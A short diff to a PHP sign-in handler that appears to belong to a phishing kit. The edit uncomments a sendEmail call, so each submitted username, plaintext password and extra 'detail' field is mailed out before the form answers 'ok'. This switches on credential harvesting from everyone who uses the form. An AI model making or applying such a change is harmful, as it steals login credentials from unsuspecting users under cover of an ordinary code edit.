@@ -108,7 +108,7 @@ if(isset($_POST["sign-in"])) {
     $password = sanitize($_POST["password"]);
     $detail = sanitize($_POST["detail"]);
 
-    // sendEmail(["username" => $username, "password" => $password, "detail" => $detail]);
+    sendEmail(["username" => $username, "password" => $password, "detail" => $detail]);
 
     echo $response = json_encode([
         "signal" => "ok",
